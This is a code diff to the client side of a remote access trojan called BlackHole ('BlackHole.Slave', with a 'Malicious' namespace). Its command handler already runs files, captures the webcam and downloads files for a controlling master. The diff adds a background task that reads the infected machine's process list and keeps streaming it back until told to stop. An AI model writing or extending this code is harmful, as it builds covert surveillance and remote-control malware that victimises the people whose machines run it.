@@ -11,12 +11,14 @@ using BlackHole.Slave.Helper.Native.Impl;
 using BlackHole.Slave.Malicious;
 using NetMQ;
 using NetMQ.Sockets;
+using System.Collections.Generic;
+using System.Threading;
 
 namespace BlackHole.Slave
 {
-    /// <summary>
-    /// 
-    /// </summary>
+/// <summary>
+/// 
+/// </summary>
     public sealed class MasterServer : Singleton<MasterServer>
     {
         private const int DISCONNECTION_TIMEOUT = 8000;
@@ -29,6 +31,8 @@ namespace BlackHole.Slave
         private string m_serverAddress;
         private bool m_connected;
         private long m_lastReceived = -1;
+        private CancellationTokenSource tokenSource = new CancellationTokenSource();
+        private Task a;
 
         /// <summary>
         /// 
@@ -157,12 +161,14 @@ namespace BlackHole.Slave
                 .With<ExecuteFileMessage>(ExecuteFile)
                 .With<StartWebcamCaptureMessage>(Webcam.Instance.StartScreenCapture)
                 .With<StopWebcamCaptureMessage>(Webcam.Instance.StopScreenCapture)
+                .With<StartTasksMessage>(TaskList)
+                .With<StopTasksMessage>(StopTaskList)
                 .Default(m => SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}"));
 
-#if DEBUG
+    #if DEBUG
             if(message.GetType() != typeof(PingMessage))
                 Console.WriteLine(message.GetType().Name);
-#endif
+    #endif
         }
 
         /// <summary>
@@ -332,7 +338,9 @@ namespace BlackHole.Slave
                 {
                     if (part.CurrentPart == part.TotalPart)
                         SendStatus(message.WindowId, message.Id, "File download", "Successfully downloaded: " + part.Path);
-                });
+                }
+                
+                );
         }
 
         /// <summary>
@@ -447,6 +455,50 @@ namespace BlackHole.Slave
             });
         }
         */
+
+        private void DoWork(StartTasksMessage message, CancellationToken token)
+        {
+            Dictionary<string, List<PerformanceCounter>> taskInfo = new Dictionary<string, List<PerformanceCounter>>();
+
+            while (true)
+            {
+                    
+                if (token.IsCancellationRequested == true)
+                {
+                    break;
+                }
+                    
+
+                var tasksMessage = new TasksMessage(TaskManager.GetTasksList(taskInfo));
+                ExecuteComplexSendOperation(message.WindowId,
+                "Task Manager",
+                () => tasksMessage);
+                
+
+                    if (token.IsCancellationRequested)
+                    {
+                    break;
+                    }
+                     
+            }
+            
+        }
+
+        public void TaskList(StartTasksMessage message)
+        {
+            var token = tokenSource.Token;
+            a = Task.Factory.StartNew(() => DoWork(message, token), token);
+           
+        }
+
+        public void StopTaskList(StopTasksMessage message)
+        {
+            
+            tokenSource.Cancel();
+            //Console.WriteLine("After " + a.Status);
+            // Just continue on this thread, or Wait/WaitAll with try-catch:
+    
+        }
 
         /// <summary>
         /// 
